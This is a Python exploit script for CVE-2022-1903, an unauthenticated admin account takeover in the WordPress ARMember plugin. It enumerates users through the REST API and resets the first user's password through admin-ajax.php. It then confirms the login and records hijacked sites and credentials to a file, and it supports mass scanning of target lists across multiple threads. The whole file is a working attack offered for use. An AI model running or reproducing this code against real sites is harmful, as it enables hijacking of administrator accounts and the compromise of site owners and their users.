# @author : biulove0x
# @name   : WP Plugins ARMember Exploiter
from urllib3.exceptions import InsecureRequestWarning
import requests
import multiprocessing
import argparse
import json

print(
'''
###########################################
# @author : biulove0x                     #
# @name   : WP Plugins ARMember Exploiter #
# @cve    : CVE-2022-1903                 #
###########################################
''')

def armember(target, timeout=5):
    global headers, cookies
    session = requests.Session()

    def save_result(result):
        saved = open('RESULT-WPAR.txt', 'a+')
        saved.write(result + '\n')
    
    try:
        get_user = session.get(url=target + 'wp-json/wp/v2/users/', headers=headers, allow_redirects=True, verify=False, timeout=timeout)
        res_user = json.loads(get_user.text)
        fon_user = res_user[0]['slug']
        payload = 'action=arm_shortcode_form_ajax_action&user_pass=biulove0x&repeat_pass=biulove0x&arm_action=change-password&key2=x&action2=rp&login2=' + fon_user
        
        exploit = session.post(url=target + 'wp-admin/admin-ajax.php', headers=headers, data=payload, allow_redirects=True, verify=False, timeout=timeout)        
        if exploit.status_code == 200:
            # Try login
            datalog = {'log': fon_user, 'pwd': 'biulove0x', 'wp-submit': 'Login', 'redirect_to': target + 'wp-admin/', 'testcookie': 1}
            validation_login = session.post(url=target + 'wp-login.php', data=datalog, cookies=cookies, allow_redirects=True, verify=False)
            if 'wp-admin/profile.php' in validation_login.text:
                print('[-] ' + target + 'wp-admin/ => Success')
                save_result(target + 'wp-login.php > ' + fon_user + ' | biulove0x')
            else:
                print('[+] ' + target + ' Not found!')
    except:
        print('[%] ' + target + ' Requests failed')

def main(choose, target, num_threads):
    if choose == 1:
        armember(target)

    elif choose == 2:
        pool = multiprocessing.Pool(processes=num_threads)
        url_list = open(target, 'r').read().split()

        results = []
        for url in url_list:
            results.append(pool.apply_async(armember, args=(url,)))

        pool.close()
        pool.join()

        for result in results:
            if result.get() is not None:
                print(result.get())
    else:
        exit()

## SSL Bypass
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

## Setup args
parser = argparse.ArgumentParser(description='CVE-2022-1903 [ ARMember < 3.4.8 - Unauthenticated Admin Account Takeover ]')
parser.add_argument('-t', metavar='example.com', type=str, help='Single target')
parser.add_argument('-l', metavar='target.txt', type=str, help='Multiple target')
parser.add_argument('-n', metavar='num_threads', type=int, default=5, help='Number of threads (default: 5)')
args = parser.parse_args()

## Variable args
single_target = args.t
multi_target = args.l
num_threads = args.n

## Variables
cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded'}

if __name__ == '__main__':
    if single_target is not None:
        choose = 1
        main(choose, single_target, num_threads)
    elif multi_target is not None:
        choose = 2
        main(choose, multi_target, num_threads)
    else:
        print('ARMember.py --help for using tools')
